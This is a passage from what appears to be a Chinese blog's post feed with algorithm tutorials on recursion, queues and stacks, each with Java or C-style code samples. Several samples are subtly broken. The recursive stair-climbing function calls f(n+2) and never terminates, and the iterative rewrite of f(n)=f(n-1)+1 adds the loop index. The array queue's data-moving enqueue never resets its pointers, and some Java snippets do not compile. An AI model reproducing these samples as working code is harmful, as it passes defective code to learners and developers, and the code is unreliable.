说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是写出递推公式，找到终止条件，剩下将递推公式转化为代码就很容易了。 我这里举个例子，来一步一步实现递归代码。 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？ 如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？ 我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：$$f(n) = f(n-1) + f(n-2) $$ 有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。 n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。 所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。 我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：$$ f(n) = f(n-1) + f(n-2); \ 其中 \ f(1)=1, f(2)=2; $$ 有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：12345int f(int n) &#123; if(n==1) return 1; if(n==2) return 2; return f(n-1)+f(n+2);&#125; 总结一下，写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。 讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。 上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。 但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。 像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。 计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。 对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？ 如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。 因此，编写递归代码的关键是，只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤 递归代码警惕堆栈溢出 在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？ 在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。 比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：1Exception in thread "main" java.lang.StackOverflowError 那么如何避免堆栈溢出呢？ 我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。 123456789// 表示递归的深度int depth = 0;int f(int n)&#123; ++depth; if(depth&gt;1000)throw exception; if(n==1) return 1; return f(n-1)+1;&#125; 但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。 递归代码警惕重复计算 除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的： 从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。 为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。 按照上面的思路，我们再来改造一下代码：1234567891011Map&lt;String, Integer&gt; map = new Hashmap&lt;&gt;();public static int f(int n)&#123; if(n==1) return 1; if(n==2) return 2; if(map.containsKey(n))&#123; return map.get(n); &#125; int ret = f(n-1) + f(n-2); map.put(n, ret); return ret;&#125; 除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。 在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。 怎样将递归代码改写为非递归代码 我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。 那我们是否可以将递归代码改写为非递归代码呢？ 仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：1234567int f(int n)&#123; int ret = 1; for(int i=2; i&lt;=n; ++i)&#123; ret = ret+i; &#125; return ret;&#125; 同样，第二个例子也可以改写为非递归的方式实现。 1234567891011121314int f(int n)&#123; if(n==1)return 1; if(n==2)return 2; int ret = 0; int prepre = 1; // f(1)=1 int pre = 2; // f(2)=2 for(int i=3;i&lt;=n;++i)&#123; //f(3) = f(2)+f(1) ret = pre + prepre; prepre = pre; pre = ret; &#125; return ret;&#125; 那是不是所有的递归代码都可以改写为这种迭代循环的非递归写法呢？ 笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。 但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。 解答开篇 到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的： 12345long findRootRefererId(long actorId)&#123; long refererId = select referer_id from [table] where actor_id = actorId; if(refererId == null) return actorId; return findRootRefererId(refererId)&#125; 是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。 第一，如果递归很深，可能会有堆栈溢出问题。 第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。 内容小结 递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。 不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。 递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-队列]]></title>
    <url>%2Fposts%2F2018-09-16-%E7%AE%97%E6%B3%95-%E9%98%9F%E5%88%97.html</url>
    <content type="text"><![CDATA[前言 我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。 当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？ 其实，这些问题并不复杂，其底层的数据结构就是今天的内容，队列(queue)。 如何理解队列 队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。先进者先出，这就是典型的队列。 我们知道，栈只支持两个操作：入栈push()和出栈pop()，队列和栈非常类似，支持的操作只有：入队enqueue()，将一个数据放入队尾，出队dequeue()，从队头取出一个数据。 所以，队列跟栈一样，也是一种操作受限的线性表数据结构。 队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。 顺序队列和链式队列 我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？ 跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做顺序队列，用链表实现的队列叫做链式队列。 先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。 12345678910111213141516171819202122232425262728293031323334353637// 基于数组实现的队列public class ArrayQueue&lt;T&gt;&#123; // 数组items private T[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public ArrayQueue()&#123; this(10); // 队列默认容量给10 &#125; public ArrayQueue(int capacity)&#123; this.items = new T[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 items[tail] = val; size ++; tail ++; return true; &#125; public T dequeue()&#123; if (size == 0) &#123; return; &#125; T res = items[head]; head++; size--; return res; &#125;&#125; 比起栈的数组实现，队列的数组实现稍微有点复杂。 对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。 你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。 当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。 你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？ 在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？数据搬移！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？ 实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。 12345678910111213141516public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 // tail到尾部，队列没有满 if (tail == capactity &amp;&amp; size&lt;capacity) &#123; // 数据搬移 for (int i=head;i&lt;tail;i++) &#123; // 将head到tail的数据搬移到0到size的位置 items[i-head] = items[i] &#125; &#125; items[tail] = val; size ++ ; tail ++; return true;&#125; 从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置， 这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的摊还分析法自行分析一下。 接下来，我们看看基于链表的队列的实现方法。 基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。 我将具体代码放到我的github上，有需要的可以看看。 循环队列 我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。 循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。 我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。 通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，确定队列空和队列满的判定条件。 在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？ 队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。 图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。 下面看下一下循环队列的代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 基于数组实现的循环队列public class CircularQueue&lt;T&gt; implements Queue&lt;T&gt; &#123; // 数组items private Object[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public CircularQueue()&#123; this(10); // 队列默认容量给10 &#125; public CircularQueue(int capacity)&#123; this.items = new Object[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if ((tail+1)%capacity == head)&#123; throw new RuntimeException("循环队列满了！"); &#125; items[tail] = val; tail = (tail+1)%capacity; size ++; return true; &#125; public T dequeue()&#123; if (size&lt;=0)&#123; throw new RuntimeException("空队列！"); &#125; T res = (T) items[head]; size--; head = (head+1)%capacity; return res; &#125; @Override public String toString() &#123; return Arrays.toString(items); &#125; @Override public int size() &#123; return size; &#125;&#125; 阻塞队列和并发队列 上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。 阻塞队列其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。 你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。 这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。 而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。 前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？ 线程安全的队列我们叫做并发队列。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。 解答开篇 队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？ 我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？ 我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？ 基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。 而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。 除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。 内容小结 今天我们讲了一种跟栈很相似的数据结构，队列。 队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。 循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。 除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。 课后思考 1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。 如数据库的连接池、分布式应用中的消息队列（kafka、MQ） 2、 关于并发队列，如何实现无锁的并发队列。 提示： CAS(compare and swap) 乐观锁 悲观锁 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-栈]]></title>
    <url>%2Fposts%2F2018-09-15-%E7%AE%97%E6%B3%95-%E6%A0%88.html</url>
    <content type="text"><![CDATA[前言 浏览器的前进、后退功能，我想你肯定很熟悉吧？ 当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。 假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。 (adsbygoogle = window.adsbygoogle || []).push({}); 如何理解栈？ 关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。先进者后出，后进者先出，这就是典型的栈结构。 从栈的操作特性上来看，栈是一种操作受限的线性表，只允许在一端插入和删除数据。 我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？ 事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。 当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构。 如何实现一个栈？ 从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。 实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做顺序栈，用链表实现的栈，我们叫做链式栈。 基于数组实现的顺序栈我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。 12345678910111213141516171819202122232425262728293031323334353637383940// 基于数组实现的链式栈public class ArrayStack&lt;T&gt; implements stack&lt;T&gt; &#123; private final Object [] DEFAULT_ARRAY = new Object[10]; private final int DEFAULT_CAP = 10; private Object[] data; private int cap; private int size; public ArrayStack() &#123; this.cap = DEFAULT_CAP; this.size = 0; this.data = DEFAULT_ARRAY; &#125; public ArrayStack(int cap)&#123; if (cap &lt; 0) throw new IllegalArgumentException("Illegal Capacity: "+ cap); this.cap = cap; this.data = new Object[cap]; &#125; public void push(T val) &#123; if (size&lt;cap)&#123; // 数组满了 data[size] = val; size++; &#125;else &#123; throw new Runtime("stack is full!") // 可以动态扩容的stack // Object[] objects = new Object[cap*2]; // System.arraycopy(data, 0, objects, 0, size); // data = objects; // data[size] = val; // size ++; &#125; &#125; public T pop() &#123; if (size == 0) return null; T result = (T) data[size-1]; size--; return result; &#125;&#125; 了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？ 不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。 注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。 时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。 支持动态扩容的顺序栈刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？ 还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。 所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。 实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。 对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。 也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。 为了分析方便，我们先做一些假设和定义： 栈空间不够时，我们重新申请一个是原来大小两倍的数组； 为了简化分析，假设只有入栈操作没有出栈操作； 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。 如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图： 从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。 通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。 栈的应用场景 栈在函数调用中的应用前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。 我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。 123456789101112131415int main()&#123; int a = 1; int ret = 0; int res = 0; ret = add(3,5); res = a + ret; printf("%d", res); return 0;&#125;int add(int x, int y)&#123; int sum = 0; sum = x + y; return sum;&#125; 从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图： 栈在表达式求值中的应用我们再来看一个栈的常见应用场景，编译器如何利用栈实现表达式求值。 这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？ 实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。 这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。 栈在括号匹配中的应用出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。 我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？ 这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。 当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。 解答开篇 好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。 我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。 当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子： 当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下： 这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下： 总结 栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。 思考 1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-怎样写好链表代码]]></title>
    <url>%2Fposts%2F2018-09-13-%E7%AE%97%E6%B3%95-%E6%80%8E%E6%A0%B7%E5%86%99%E5%A5%BD%E9%93%BE%E8%A1%A8%E4%BB%A3%E7%A0%81.html</url>
